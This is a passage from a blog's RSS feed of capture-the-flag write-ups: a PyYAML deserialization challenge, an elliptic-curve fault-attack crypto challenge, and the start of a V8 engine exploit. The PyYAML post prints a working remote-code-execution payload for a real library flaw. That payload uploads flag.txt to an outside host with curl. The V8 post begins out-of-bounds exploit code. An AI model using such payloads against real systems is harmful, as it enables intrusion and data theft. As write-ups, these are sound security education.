&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/VJGJJ.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;h3 id=&#34;similar-glyphs&#34;&gt;Similar glyphs&lt;/h3&gt;

&lt;p&gt;In fact, most of cases I solve manually the edit distance is between 1-2 characters and the problematic region are share by different models...&lt;/p&gt;

&lt;p&gt;For example PTJYZ:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/PTJYZ.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Option available:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/failure.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;That is it! Thanks for reading! :)&lt;/p&gt;

&lt;p&gt;&lt;/font&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>UIUCTF 2020: deserializeme</title>
      <link>https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/</link>
      <pubDate>Wed, 22 Jul 2020 18:55:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Update: It was assigned as &lt;a href=&#34;https://access.redhat.com/security/cve/cve-2020-14343&#34;&gt;CVE-2020-14343&lt;/a&gt; after the contest.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was a fun challenge exploiting a deserialize service in Python.&lt;/p&gt;

&lt;p&gt;The server is using &lt;a href=&#34;https://github.com/yaml/pyyaml/tree/5.3.1&#34;&gt;pyYAML&lt;/a&gt; and Flask, with the source code below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python=&#34; data-lang=&#34;python=&#34;&gt;from flask import Flask, session, request, make_response
import yaml
import re
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;POST&amp;#34;])
def pwnme():
    if not re.fullmatch(b&amp;#34;^[\n --/-\]a-}]*$&amp;#34;, request.data, flags=re.MULTILINE):
        return &amp;#34;Nice try!&amp;#34;, 400
    return yaml.load(request.data)

if __name__ == &amp;#39;__main__&amp;#39;:
    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8080)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Bascially it is a service to do yaml.load() to your input and print it (return) with limitation to block some special character (especially &lt;code&gt;.&lt;/code&gt; and &lt;code&gt;_&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;The version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.&lt;/p&gt;

&lt;p&gt;We noticed that &lt;code&gt;yaml.load&lt;/code&gt; is &amp;quot;unsafe&amp;quot; by the README:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;When LibYAML bindings are installed, you may use fast LibYAML-based
parser and emitter as follows:

    &amp;gt;&amp;gt;&amp;gt; yaml.load(stream, Loader=yaml.CLoader)
    &amp;gt;&amp;gt;&amp;gt; yaml.dump(data, Dumper=yaml.CDumper)

If you don&amp;#39;t trust the input stream, you should use:

    &amp;gt;&amp;gt;&amp;gt; yaml.safe_load(stream)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So we dig into the internals of yaml loader.&lt;/p&gt;

&lt;p&gt;From the source code, when loader is not provided, it uses &lt;code&gt;FullLoader&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;load&lt;/span&gt;(stream, Loader&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;None):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Parse the first YAML document in a stream
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    and produce the corresponding Python object.
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; Loader &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
        load_warning(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;load&amp;#39;&lt;/span&gt;)
        Loader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FullLoader

    loader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Loader(stream)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; loader&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_single_data()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
        loader&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dispose()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And &lt;code&gt;FullLoader&lt;/code&gt; uses &lt;code&gt;FullConstructor&lt;/code&gt; to construct the python objects in:
&lt;a href=&#34;https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py&#34;&gt;https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The differences of &lt;code&gt;FullConstructor&lt;/code&gt; and &lt;code&gt;UnsafeConstructor&lt;/code&gt; is, UnsafeConstructor can uses the yaml tag: &lt;code&gt;python/object/apply&lt;/code&gt; (that can be used to call functions) and it doesn&#39;t block some reserved keywords.&lt;/p&gt;

&lt;p&gt;From there, we guessed the challenge was to do an RCE using &lt;code&gt;python/object/new&lt;/code&gt; tag (that is available in FullConstructor) and somehow bypass the CVE-2020-1747 &lt;a href=&#34;https://github.com/yaml/pyyaml/pull/386&#34;&gt;fixes&lt;/a&gt;.
(With the POC &lt;a href=&#34;https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1&#34;&gt;here&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;The CVE-2020-1747 exploits the fact that user can input a object with a customized &lt;code&gt;extend&lt;/code&gt; function, so that after the object is constructed (with &lt;code&gt;python/object/new&lt;/code&gt; / &lt;code&gt;python/object/apply&lt;/code&gt;), it can trigger the function &lt;code&gt;extend&lt;/code&gt; as it is used by the constructor as below:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;construct_python_object_apply&lt;/span&gt;(self, suffix, node, newobj&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False):
        &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
        instance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;make_python_instance(suffix, node, args, kwds, newobj)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; state:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_python_instance_state(instance, state)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; listitems:
            instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;extend(listitems)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dictitems:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; dictitems:
                instance[key] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dictitems[key]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; instance&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;While the format of &lt;code&gt;python/object/apply&lt;/code&gt; can supply states for the object, we can use &lt;code&gt;python/name&lt;/code&gt; to reference a python internal function (exec, eval etc). We cannot use an module function as &lt;code&gt;.&lt;/code&gt; and &lt;code&gt;_&lt;/code&gt; is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by &lt;code&gt;FullConstructor&lt;/code&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#   !!python/object/apply       # (or !!python/object/new)
#   args: [ ... arguments ... ]
#   kwds: { ... keywords ... }
#   state: ... state ...
#   listitems: [ ... listitems ... ]
#   dictitems: { ... dictitems ... }
# or short format:
#   !!python/object/apply [ ... arguments ... ]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The 5.3.1 fixes also blocked the key &lt;code&gt;extend&lt;/code&gt; and &lt;code&gt;^__.*__$&lt;/code&gt; to disallow setting those key with the state parameter.&lt;/p&gt;

&lt;p&gt;We discovered that we can use &lt;code&gt;python/object/new&lt;/code&gt; with &lt;code&gt;type&lt;/code&gt; constructor (&lt;code&gt;type&lt;/code&gt; is a type...) to create new types with some customized internal state. With this, we can bypass the &lt;code&gt;state&lt;/code&gt; key block mechanism and freely set our object to something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/new:type
  args: [&amp;#34;z&amp;#34;, !!python/tuple [], {&amp;#34;extend&amp;#34;: !!python/name:exec }]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With this we can put our commands to &lt;code&gt;listitems&lt;/code&gt;, and the constructor will call &lt;code&gt;instance.extend(listitems)&lt;/code&gt;, thus finish our RCE exploit.&lt;/p&gt;

&lt;p&gt;Full payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/new:type
  args: [&amp;#34;z&amp;#34;, !!python/tuple [], {&amp;#34;extend&amp;#34;: !!python/name:exec }]
  listitems: &amp;#34;\x5f\x5fimport\x5f\x5f(&amp;#39;os&amp;#39;)\x2esystem(&amp;#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&amp;#39;)&amp;#34;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(We changed &lt;code&gt;_&lt;/code&gt; to &lt;code&gt;\x5f&lt;/code&gt; and &lt;code&gt;.&lt;/code&gt; to &lt;code&gt;\x2e&lt;/code&gt; to bypass the regex limitation)&lt;/p&gt;

&lt;p&gt;The intended solution uses &lt;code&gt;map&lt;/code&gt; as a type (as it is a type in Python 3):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &amp;#39;PAYLOAD_HERE&amp;#39; ]]]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is essentially the python code &lt;code&gt;tuple(map(eval, &amp;quot;PAYLOAD&amp;quot;)))&lt;/code&gt;, and this works as &lt;code&gt;map&lt;/code&gt; and &lt;code&gt;tuple&lt;/code&gt; are both class constructor (so it doesnt use any function as apply calls).&lt;/p&gt;

&lt;p&gt;Thanks for the author for such cool challenge (basically used a 0day for the CTF challenge).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>UIUCTF 2020: nookcrypt</title>
      <link>https://b6a.black/posts/2020-07-22-uiuctf-nookcrypt/</link>
      <pubDate>Wed, 22 Jul 2020 18:55:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-22-uiuctf-nookcrypt/</guid>
      <description>&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;nookcrypt&lt;/em&gt; is a netcat service that have no source code released. There are two functions exposed:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Gets an encrypted copy of the flag (and the message &lt;code&gt;hello world&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Encrypts an arbitrary message.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For example, this is what I had when trying out the options:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Option: 1
enc(FLAG) = (0xf31ce7cb1f2c6e7107318d76bdda50c5, 0x02d979fc3122bbaffcc1111953bc184f)
enc(&amp;#39;hello world&amp;#39;) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9)

Option: 2
msg: hello world
enc(0x68656c6c6f20776f726c64) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since the response is consistent after reconnecting to the netcat service for multiple times, I assume that the parameters are constant.&lt;/p&gt;

&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;

&lt;h3 id=&#34;part-i-recovering-the-curve-parameters-in-a-stupid-way&#34;&gt;Part I: Recovering the curve parameters in a stupid way&lt;/h3&gt;

&lt;p&gt;Since it is mentioning elliptic curves in its services, the first thing I was doing is to recover the parameters, namely, $a$, $b$ and $p$ for the elliptic curve $y^2 \equiv x^3 + ax + b\ (\text{mod}\ p)$.&lt;/p&gt;

&lt;p&gt;My attempt is to encrypt a bunch of messages:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msg: a
enc(0x61) = (0xb2d6c27a99b52aec6e243d4e4f67cb71, 0x9dfa2bd87ea1e09388493137132cc534)

msg: b
enc(0x62) = (0x99b8150ebf23c69ee1056f0e329496ae, 0xe1febe35a5877f00f3876c2a24fb9164)

msg: c
enc(0x63) = (0x3e7ef6d1106382119a0fa8c966f6d1df, 0x89d81b9fab5336a227414491881bbee8)

msg: d
enc(0x64) = (0x985dbb38a65f4e69bfc602d7e114cad9, 0xcad1cb62a3d30b05093575f3a22f7e3c)

...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Define $C_i = (x_i, y_i)$ be the ciphertexts of some message $m_i$. By direct substitution, we have $y_i^2 \equiv x_i^3 + ax_i + b\ (\text{mod}\ p)$ for all $i$.&lt;/p&gt;

&lt;p&gt;Assume that we have three ciphertexts. We can deduce that:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$a(x_1 - x_2) \equiv y_1^2 - y_2^2 - x_1^3 + x_2^3 \ (\text{mod}\ p)$ and&lt;/li&gt;
&lt;li&gt;$a(x_2 - x_3) \equiv y_2^2 - y_3^2 - x_2^3 + x_3^3 \ (\text{mod}\ p)$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;From above, we know $(y_1^2 - y_2^2 - x_1^3 + x_2^3)(x_2 - x_3) - (y_2^2 - y_3^2 - x_2^3 + x_3^3)(x_1 - x_2)$ is a multiple of $p$.&lt;/p&gt;

&lt;p&gt;So we have collected a bunch of &amp;quot;multiples of $p$&amp;quot; and take their gcd. We have recovered that $p = 340282366762482138434845932244680310783$.&lt;/p&gt;

&lt;p&gt;Then it is rather obvious to recover $a = 284470887156368047300405921324061011681$ and $b = 126188322377389722996253562430093625949$.&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Question.&lt;/strong&gt; What if it is not defined on a prime field? Well&amp;hellip; I didn&amp;rsquo;t think of that. But who cares? I could probably observe this if my approach doesn&amp;rsquo;t work out.
&lt;/div&gt;
  

&lt;h3 id=&#34;part-ii-a-reflection-on-the-aftermath&#34;&gt;Part II: A reflection on the &amp;quot;after-math&amp;quot;&lt;/h3&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  &lt;strong&gt;Note.&lt;/strong&gt; I did not think of this during the game. Stupid me.
&lt;/div&gt;
  

&lt;p&gt;Knowing that the ciphertext $C$ is a multiple of the message $m$, i.e., $C = mG$, we can simply encrypt $m = 1$:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Opening connection to chal.uiuc.tf on port 2006: Done
[DEBUG] Received 0x123 bytes:
    b&amp;#39;\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;Welcome to NookCrypt! Here we use fancy\n&amp;#39;
    b&amp;#39;elliptic curve encryption to keep your \n&amp;#39;
    b&amp;#39;messages safe! Try it out!\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;1. get (encrypted) flag\n&amp;#39;
    b&amp;#39;2. encrypt message\n&amp;#39;
    b&amp;#39;3. quit\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;\n&amp;#39;
    b&amp;#39;Option: &amp;#39;
[DEBUG] Sent 0x2 bytes:
    b&amp;#39;2\n&amp;#39;
[DEBUG] Received 0x5 bytes:
    b&amp;#39;msg: &amp;#39;
[DEBUG] Sent 0x2 bytes:
    00000000  01 0a                                               │··│
    00000002
[DEBUG] Received 0x178 bytes:
    b&amp;#39;enc(0x01) = (0x7b6aa5d85e572983e6fb32a7cdebc140, 0x27b6916a894d3aee7106fe805fc34b44)\n&amp;#39;
    b&amp;#39;\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;Welcome to NookCrypt! Here we use fancy\n&amp;#39;
    b&amp;#39;elliptic curve encryption to keep your \n&amp;#39;
    b&amp;#39;messages safe! Try it out!\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;1. get (encrypted) flag\n&amp;#39;
    b&amp;#39;2. encrypt message\n&amp;#39;
    b&amp;#39;3. quit\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;\n&amp;#39;
    b&amp;#39;Option: &amp;#39;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What can we do? Since this is $G$, we can simply search this on Google:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-nookcrypt/secp128r2.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;Ta-da :tada: - it is the generator for curve &lt;em&gt;secp128r2&lt;/em&gt;. You would think this is a ta-da moment, I would say that this is a facepalm moment. I could spent much less time on recovering the parameters in such a way.&lt;/p&gt;

&lt;p&gt;Well, I was even more confused to notice that is a secure curve. I personally don&#39;t have a backdoor of &lt;em&gt;secp128r2&lt;/em&gt; (I am much appreciated if you tell me if you do) and thought the challenge isn&#39;t doable.&lt;/p&gt;

&lt;h3 id=&#34;part-iii-hint-for-nookcrypt-crypto-500&#34;&gt;Part III: &amp;quot;Hint for nookcrypt (crypto 500)&amp;quot;&lt;/h3&gt;

&lt;p&gt;Fours hours later the organizers released a hint in the Discord server:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-nookcrypt/announcement.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;When I was &lt;del&gt;being played&lt;/del&gt; writing an interactor with the service, I observed that there was a strange behaviour regarding to the flag encryption method:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;========================================
Welcome to NookCrypt! Here we use fancy
elliptic curve encryption to keep your 
messages safe! Try it out!
========================================
1. get (encrypted) flag
2. encrypt message
3. quit
========================================

Option: 1
err&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Oh. So the error was caused by the cosmic ray. Okay.&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Did you really get it instantly when the hint is announced?&lt;/strong&gt; No.
&lt;/div&gt;
  

&lt;h3 id=&#34;part-iv-somebody-made-a-breakthrough&#34;&gt;Part IV: Somebody made a breakthrough&lt;/h3&gt;

&lt;p&gt;Ten hours later, &lt;em&gt;somebody&lt;/em&gt; from Discord claimed that he has a strange observation:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-nookcrypt/breakthrough.png&#34;/&gt; 
&lt;/figure&gt;


&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Who was the somebody?&lt;/strong&gt; Me.
&lt;/div&gt;
  

&lt;p&gt;We made a bunch of assumptions. Cutting the crap, we assumed that the same generator $G = (x_G, y_G)$ is being multipled in a same way, except that the curve is operated on new modulo $p&#39;$. This matches the author&#39;s statement regarding on the prime being corrupted.&lt;/p&gt;

&lt;p&gt;However, obviously, it is very likely that $G$ may not be a point the above curve. Luckily (or unluckily), we can assume that it is operating on another curve $y^2 \equiv x^3 + ax + b&#39;\ (\text{mod}\ p&#39;)$, such that $G$ is on it.&lt;/p&gt;

&lt;p&gt;For now, we are given two points on this curve (the ciphertexts of the flag $F = (x_F, y_F)$ and the message &lt;code&gt;hello world&lt;/code&gt; $M = (x_M, y_M)$). Since $a$ is known we can easily recover $p&#39;$ by:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{aligned}
p&#39; = \text{gcd}( &amp;(y_F^2 - x_F^3 - ax_F - b&#39;) - (y_G^2 - x_G^3 - ax_G - b&#39;), \\
&amp; (y_M^2 - x_M^3 - ax_M - b&#39;) - (y_G^2 - x_G^3 - ax_G - b&#39;))
\end{aligned}
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The order of the generator should be a large prime for an elliptic curve to be secure. Clearly this property may not hold on those new modulos struck by cosmic may. For instance, suppose that we have $p&#39; = 340282366762482138434845932242512471141$. Since 67 is a factor of $p&#39;$, we are indeed working on the curve $y^2 \equiv x^3 + ax + b&#39;\ (\text{mod}\ 67)$. $G$ has a order 74, and $F = fG = 21G$. It implies that $f \equiv 21\ (\text{mod}\ 74)$.&lt;/p&gt;

&lt;p&gt;By collecting a bunch of linear congruences, we can find $f$ by the Chinese Remainder Theorem. Eventually we have the flag: &lt;code&gt;uiuctf{th4t_5ur3_w4s_f4ulty_huh?}&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CONFidence 2020 Teaser CTF: Chromatic Aberration</title>
      <link>https://b6a.black/posts/2020-07-01-confidencectf-teaser-chromatic/</link>
      <pubDate>Wed, 01 Jul 2020 15:30:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-01-confidencectf-teaser-chromatic/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Chromatic Aberration
Points: 182
Solves: 20
Pwn our chrome for fun and profit.

Ok, it&amp;#39;s not really Chrome, but it&amp;#39;s close enough.

Let&amp;#39;s say, it&amp;#39;s chromatic

The memory limit is 64MB

nc chromatic-aberration.zajebistyc.tf 31004
6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M
For people having problems with the above link, try this ones

6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M
6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this CTF Question, author introduced a OOB read and arbitary write to the &lt;code&gt;Array.fill&lt;/code&gt; of the V8 engine. So, our exploitation will be very straightforward. First, we will set up an array of &lt;code&gt;BitInt&lt;/code&gt;s with &lt;code&gt;0x33313131&lt;/code&gt; as marking for arbitary write after we collect sufficient primitive with the OOB.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BigUint64Array&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33313131&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32323232&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, we will setup an array of &lt;code&gt;ArrayBuffer&lt;/code&gt; and trigger garbage collection to move all of this items to the oldspace. As mentioned in the doc of GC, its expected to trigger in anytime, this step can ensure the address leaked will be constant throughout the exploitation. This is essential for locating relative information and escalate to code execution (there is a better way for this chall though).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ab&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x200&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;ab&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1337&lt;/span&gt;));
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AAAAAAAA&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BBBBBBBB&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CCCCCCCC&amp;#39;&lt;/span&gt;]
&lt;span style=&#34;color:#a6e22e&#34;&gt;gc&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;gc&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Locate relative postion of tarr&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We use the OOB read primitive to locate the relative position of &lt;code&gt;tarr&lt;/code&gt; from &lt;code&gt;oob_str_arr&lt;/code&gt; and locate one of the &lt;code&gt;ArrayBuffer&lt;/code&gt;s:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tarr_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
